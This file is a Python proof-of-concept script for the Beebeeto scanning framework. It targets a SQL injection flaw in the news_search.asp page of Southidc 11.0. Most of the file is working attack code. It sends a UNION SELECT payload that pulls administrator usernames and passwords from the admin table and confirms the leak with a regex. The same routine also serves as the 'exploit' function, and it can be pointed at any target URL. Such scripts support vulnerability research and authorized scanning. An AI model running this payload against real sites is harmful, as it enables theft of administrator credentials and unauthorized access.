#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0073',
            'name': 'Southidc 南方数据 11.0 /news_search.asp SQL注入漏洞 POC',
            'author': 'ca2fux1n',
            'create_date': '2015-03-24',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'southidc',
            'vul_version': ['11.0'],
            'type': 'SQL Injection',
            'tag': ['southidc', 'news_search.asp', 'SQL Injection', '南方数据'],
            'desc': 'southidc v10.0到v11.0版本中news_search.asp文件对key参数没有适当过滤，导致SQL注入漏洞。',
            'references': ['http://sebug.net/vuldb/ssvid-62399'],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/news_search.asp?'
        payload = ("key=7'%20Union%20select%200,username%2bchr(124)%2bpassword,"
                   "2,3,4,5,6,7,8,9%20from%20admin%20where%1%20or%20''='&otype=title&Submit=%CB%D1%CB%F7")
        req = urllib2.Request(verify_url + payload)
        res = urllib2.urlopen(req)
        content = res.read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url + payload
        if res.code == 200:
            pattern = re.compile(r'.*?\">(?P<username>[a-zA-Z0-9]+)\|(?P<password>[a-zA-Z0-9]+)',re.I|re.S)
            match = pattern.match(content)
            if match:
               args['success'] = True
               args['poc_ret']['vul_url'] = verify_url + payload
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())